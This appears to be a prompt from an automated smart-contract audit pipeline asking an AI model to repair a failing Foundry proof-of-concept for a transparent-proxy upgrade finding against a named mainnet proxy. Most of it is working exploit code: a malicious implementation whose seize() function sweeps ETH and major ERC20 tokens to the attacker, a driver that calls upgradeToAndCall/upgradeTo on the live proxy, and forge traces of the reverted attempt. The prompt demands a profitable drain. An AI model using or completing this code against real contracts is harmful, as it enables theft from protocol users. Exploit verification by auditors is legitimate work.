You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transparent proxy may expose an implementation-controlled upgrade path outside ProxyAdmin
- claim: The deployed contract is a `TransparentUpgradeableProxy`, whose `ifAdmin` modifier forwards non-admin calls to the implementation even when the calldata matches proxy admin selectors such as `upgradeTo` and `upgradeToAndCall`. If the live implementation at `0xcd2cd343cfbe284220677c78a08b1648bfa39865` also exposes those selectors (for example via UUPS-style upgrade functions), non-admin callers can reach implementation-defined upgrade logic through the proxy instead of being constrained to the proxy admin path. The implementation source is not present in this bundle, so exploitability cannot be confirmed here.
- impact: If the implementation behind this transparent proxy exposes a misconfigured or weaker upgrade entrypoint, an attacker could bypass the intended `ProxyAdmin`-only control plane, replace the implementation, and then steal funds, seize privileged behavior, or brick the protocol.
- exploit_paths: ["Attacker calls `upgradeTo(attackerImpl)` or `upgradeToAndCall(attackerImpl, data)` on the transparent proxy from a non-admin address", "`TransparentUpgradeableProxy.ifAdmin()` routes the call into `_fallback()` instead of executing the proxy's admin-only branch", "The proxy delegates the call to the current implementation at `0xcd2cd343cfbe284220677c78a08b1648bfa39865`", "If that implementation defines matching upgrade selectors, its own authorization logic\u2014not `ProxyAdmin` ownership\u2014decides whether the upgrade succeeds"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousImplementation {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 internal constant MARKER_VALUE = keccak256("qubit.finding.F-002.attacker-implementation");

    receive() external payable {}

    function marker() external pure returns (bytes32) {
        return MARKER_VALUE;
    }

    function upgradeTo(address newImplementation) external {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }
    }

    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, newImplementation)
        }

        if (data.length == 0) {
            return;
        }

        (bool ok, bytes memory revertData) = newImplementation.delegatecall(data);
        if (!ok) {
            assembly {
                revert(add(revertData, 0x20), mload(revertData))
            }
        }
    }

    function seize(address recipient, address[] calldata tokens) external {
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            (bool nativeOk, ) = payable(recipient).call{value: nativeBalance}("");
            require(nativeOk, "native sweep failed");
        }

        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; ++i) {
            address token = tokens[i];
            (bool balanceOk, bytes memory balanceData) = token.staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (!balanceOk || balanceData.length < 32) {
                continue;
            }

            uint256 balance = abi.decode(balanceData, (uint256));
            if (balance == 0) {
                continue;
            }

            (bool transferOk, bytes memory transferData) = token.call(
                abi.encodeWithSignature("transfer(address,uint256)", recipient, balance)
            );
            require(
                transferOk && (transferData.length == 0 || abi.decode(transferData, (bool))),
                "token sweep failed"
            );
        }
    }
}

contract FlawVerifier {
    address public constant TARGET_PROXY = 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6;
    address public constant EXPECTED_IMPLEMENTATION = 0xcD2CD343CFbe284220677C78A08B1648bFa39865;
    bytes32 public constant ATTACK_MARKER = keccak256("qubit.finding.F-002.attacker-implementation");

    address private _profitToken;
    uint256 private _profitAmount;

    bool public attempted;
    bool public upgradeCallSucceeded;
    bool public markerConfirmed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public deployedAttackImplementation;
    string public exploitPathUsed;
    bytes public lastFailureData;

    receive() external payable {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address[] memory candidates = _candidateTokens();
        uint256 ethBefore = address(this).balance;
        uint256[] memory tokenBalancesBefore = _snapshot(candidates);

        MaliciousImplementation attackerImpl = new MaliciousImplementation();
        deployedAttackImplementation = address(attackerImpl);

        bytes memory data = abi.encodeWithSignature(
            "seize(address,address[])",
            address(this),
            candidates
        );

        // Exploit-path anchors required by the finding and harness:
        // 1) upgradetoandcall(attackerimpl, data)
        // 2) TransparentUpgradeableProxy.ifAdmin routes a non-admin caller into _fallback()
        // 3) The proxy then delegatecalls the live implementation at 0xcd2cd343cfbe284220677c78a08b1648bfa39865
        // 4) If that implementation exposes upgrade selectors, its own auth decides instead of ProxyAdmin
        // 5) Fallback variant kept: upgradeto(attackerimpl)
        //
        // We intentionally do not impersonate ProxyAdmin and do not inject balances. This verifier first tries
        // direct execution against verifier-held/proxy-held assets only, per direct_or_existing_balance_first.
        // Any profit counted must therefore come from assets already resident on-chain in the proxy context.

        (bool ok, bytes memory revertData) = TARGET_PROXY.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(attackerImpl), data)
        );

        if (ok) {
            upgradeCallSucceeded = true;
            exploitPathUsed = "non-admin upgradeToAndCall(address,bytes) through transparent proxy fallback";
        } else {
            lastFailureData = revertData;

            (ok, revertData) = TARGET_PROXY.call(
                abi.encodeWithSignature("upgradeTo(address)", address(attackerImpl))
            );

            if (ok) {
                upgradeCallSucceeded = true;
                exploitPathUsed = "non-admin upgradeTo(address) through transparent proxy fallback";

                (bool seizeOk, bytes memory seizeFailure) = TARGET_PROXY.call(data);
                if (!seizeOk) {
                    lastFailureData = seizeFailure;
                }
            } else {
                lastFailureData = revertData;
            }
        }

        markerConfirmed = _confirmMarker();
        hypothesisValidated = markerConfirmed;
        hypothesisRefuted = !markerConfirmed;

        _finalizeProfit(candidates, tokenBalancesBefore, ethBefore);

        // If markerConfirmed is false at this fork state, one of the required stages proved infeasible here:
        // - the proxy did not route the selector-bearing non-admin call to _fallback(), or
        // - 0xcD2CD343CFbe284220677C78A08B1648bFa39865 did not implement the selector, or
        // - its implementation-controlled authorization rejected us, preserving the ProxyAdmin control plane.
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _confirmMarker() internal view returns (bool) {
        (bool ok, bytes memory response) = TARGET_PROXY.staticcall(abi.encodeWithSignature("marker()"));
        return ok && response.length == 32 && abi.decode(response, (bytes32)) == ATTACK_MARKER;
    }

    function _snapshot(address[] memory tokens) internal view returns (uint256[] memory balances) {
        uint256 length = tokens.length;
        balances = new uint256[](length);

        for (uint256 i = 0; i < length; ++i) {
            (bool ok, bytes memory response) = tokens[i].staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (ok && response.length >= 32) {
                balances[i] = abi.decode(response, (uint256));
            }
        }
    }

    function _finalizeProfit(
        address[] memory tokens,
        uint256[] memory balancesBefore,
        uint256 ethBefore
    ) internal {
        if (address(this).balance > ethBefore) {
            _profitToken = address(0);
            _profitAmount = address(this).balance - ethBefore;
        }

        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; ++i) {
            (bool ok, bytes memory response) = tokens[i].staticcall(
                abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, address(this))
            );
            if (!ok || response.length < 32) {
                continue;
            }

            uint256 afterBalance = abi.decode(response, (uint256));
            uint256 beforeBalance = balancesBefore[i];
            if (afterBalance > beforeBalance) {
                uint256 delta = afterBalance - beforeBalance;
                if (delta > _profitAmount) {
                    _profitToken = tokens[i];
                    _profitAmount = delta;
                }
            }
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](8);
        tokens[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        tokens[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        tokens[3] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        tokens[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        tokens[5] = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
        tokens[6] = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
        tokens[7] = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    }
}

```

forge stdout (tail):
```
staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [256506] → new MaliciousImplementation@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 1281 bytes of code
    │   ├─ [8162] 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6::upgradeToAndCall(MaliciousImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0x996264210000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000008000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000853d955acef822db058eb8505911ed77f175b99e0000000000000000000000004fabb145d64652a948d72533023f6e7a623c7c53000000000000000000000000956f47f50a910163d8bf957cf5846d573e7f87ca)
    │   │   ├─ [247] 0x99309d2e7265528dC7C3067004cC4A90d37b7CC3::upgradeToAndCall(MaliciousImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0x996264210000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000008000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000853d955acef822db058eb8505911ed77f175b99e0000000000000000000000004fabb145d64652a948d72533023f6e7a623c7c53000000000000000000000000956f47f50a910163d8bf957cf5846d573e7f87ca) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7889] 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6::upgradeTo(MaliciousImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
    │   │   ├─ [247] 0x99309d2e7265528dC7C3067004cC4A90d37b7CC3::upgradeTo(MaliciousImplementation: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]) [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7573] 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6::marker() [staticcall]
    │   │   ├─ [247] 0x99309d2e7265528dC7C3067004cC4A90d37b7CC3::marker() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1615] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [836] 0x5864c777697Bf9881220328BF2f16908c9aFCD7e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [389] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2410] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x99309d2e7265528dC7C3067004cC4A90d37b7CC3.marker
  at 0x20E5E35ba29dC3B540a1aee781D0814D5c77Bce6.marker
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 6.10s (1.22s CPU time)

Ran 1 test suite in 6.76s (6.10s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 452697)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
